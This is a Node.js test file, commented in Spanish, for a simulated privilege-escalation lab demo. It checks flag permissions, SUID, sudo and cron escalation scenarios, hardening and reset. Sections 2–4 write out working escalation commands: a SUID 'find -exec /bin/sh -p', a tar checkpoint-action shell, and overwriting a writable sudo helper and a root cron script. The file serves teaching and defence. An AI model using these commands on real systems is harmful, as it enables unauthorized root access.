#!/usr/bin/env node
/*
 * Pruebas del motor de la demo web (site/demo/demo.js).
 * No necesitan navegador ni dependencias: node tests/test-demo.js
 */
'use strict';

const { makeLab } = require('../site/demo/demo.js');

let pass = 0;
let fail = 0;

function ok(name, cond, detail) {
  if (cond) { pass++; console.log('PASS ' + name); }
  else { fail++; console.log('FAIL ' + name + (detail ? ' :: ' + detail : '')); }
}

function text(res) {
  return res.out.map((l) => l.text).join('\n');
}

function run(lab, cmd) { return text(lab.exec(cmd)); }

// 1. Línea base de cuentas y flags
{
  const lab = makeLab();
  ok('id de labuser es 1001', /uid=1001\(labuser\)/.test(run(lab, 'id')));
  ok('labuser lee la flag USER', /VS\{USER-/.test(run(lab, 'cat /opt/vulnserver/flags/user.txt')));
  ok('la flag USER queda registrada', lab.state.captured.includes('user'));

  const denied = run(lab, 'cat /opt/vulnserver/flags/privilege.txt');
  ok('labuser NO lee privilege.txt', /permiso denegado/.test(denied));
  const deniedRoot = run(lab, 'cat /opt/vulnserver/flags/root.txt');
  ok('labuser NO lee root.txt', /permiso denegado/.test(deniedRoot));
  ok('no se registró ninguna flag ajena', lab.state.captured.length === 1);

  const logs = run(lab, 'cat /opt/vulnserver/logs/events.log');
  ok('labuser NO lee el directorio de logs', /permiso denegado/.test(logs));
  lab.setUser('root');
  ok('root Sí lee events.log', /FLAG_CAPTURED/.test(run(lab, 'cat /opt/vulnserver/logs/events.log')));
}

// 2. Escenario A — SUID en find
{
  const lab = makeLab();
  const out = run(lab,
    "/usr/bin/find /tmp -maxdepth 0 -exec /bin/sh -p -c 'cat /opt/vulnserver/flags/root.txt' \\;");
  ok('A: find con SUID entrega la flag ROOT', /VS\{ROOT-/.test(out), out);
  ok('A: la flag ROOT queda registrada', lab.state.captured.includes('root'));
}

// 3. Escenario B — delegación de sudo
{
  const lab = makeLab();
  const list = run(lab, 'sudo -l');
  ok('B: sudo -l muestra la delegación', /labpriv\) NOPASSWD/.test(list), list);

  const priv = run(lab, 'sudo -u labpriv cat /opt/vulnserver/flags/privilege.txt');
  ok('B: labpriv lee privilege.txt', /VS\{PRIV-/.test(priv), priv);

  const shell = run(lab, 'sudo -u labpriv tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash');
  ok('B: tar abre shell como labpriv', lab.state.user === 'labpriv', shell);

  run(lab, "printf '#!/bin/bash\\ncat /opt/vulnserver/flags/root.txt > /tmp/rootproof\\nchmod 644 /tmp/rootproof\\n' > /usr/local/bin/lab-healthcheck");
  run(lab, 'sudo -n /usr/local/bin/lab-healthcheck');
  const proof = run(lab, 'cat /tmp/rootproof');
  ok('B: el ayudante escribible entrega root', /VS\{ROOT-/.test(proof), proof);
  ok('B: la flag ROOT queda registrada', lab.state.captured.includes('root'));
}

// 4. Escenario C — cron de root
{
  const lab = makeLab();
  run(lab, 'mv /opt/vulnserver/lab/cron/lab-cleanup.sh /opt/vulnserver/lab/cron/orig.sh');
  run(lab, "printf '#!/bin/bash\\nid > /tmp/cron-id\\ncat /opt/vulnserver/flags/root.txt > /tmp/cron-root\\nchmod 644 /tmp/cron-root\\n' > /opt/vulnserver/lab/cron/lab-cleanup.sh");
  ok('C: el script fue reemplazado', /cron-id/.test(lab.node('/opt/vulnserver/lab/cron/lab-cleanup.sh').content));

  lab.cronTick();
  ok('C: cron corre como uid 0', /uid=0\(root\)/.test(lab.node('/tmp/cron-id').content));
  const proof = run(lab, 'cat /tmp/cron-root');
  ok('C: cron copia la flag ROOT', /VS\{ROOT-/.test(proof), proof);
}

// 5. Hardening como propietario
{
  const lab = makeLab();
  lab.setUser('adminlab');
  const applied = run(lab, 'sudo ./harden.sh --apply');
  ok('H: hardening aplica cambios', /SUID retirado/.test(applied), applied);
  ok('H: los escenarios quedan inactivos', !lab.state.scenarios.a && !lab.state.scenarios.b && !lab.state.scenarios.c);

  const audit = run(lab, 'sudo ./audit.sh');
  ok('H: la auditoría posterior es 0 FAIL', /Resultado: 0 FAIL/.test(audit), audit);

  const findOut = run(lab,
    "/usr/bin/find /tmp -maxdepth 0 -exec /bin/sh -p -c 'cat /opt/vulnserver/flags/root.txt' \\;");
  ok('H: la ruta SUID ya no entrega root', !/VS\{ROOT-/.test(findOut), findOut);

  lab.setUser('labuser');
  const sudoOut = run(lab, 'sudo -u labpriv cat /opt/vulnserver/flags/privilege.txt');
  ok('H: la delegación de sudo ya no existe', !/VS\{PRIV-/.test(sudoOut), sudoOut);
}

// 6. Reset rota las flags
{
  const lab = makeLab();
  const before = lab.state.flags.user;
  run(lab, 'cat /opt/vulnserver/flags/user.txt');
  ok('R: la flag se capturó antes del reset', lab.state.captured.length === 1);
  run(lab, './reset-lab.sh --yes');
  ok('R: la flag cambió', lab.state.flags.user !== before);
  ok('R: los objetivos se limpian', lab.state.captured.length === 0);
  ok('R: vuelve a la línea base vulnerable', lab.state.scenarios.a && lab.state.scenarios.b && lab.state.scenarios.c);
}

console.log('\nSUMMARY|PASS=' + pass + '|FAIL=' + fail);
process.exit(fail === 0 ? 0 : 1);
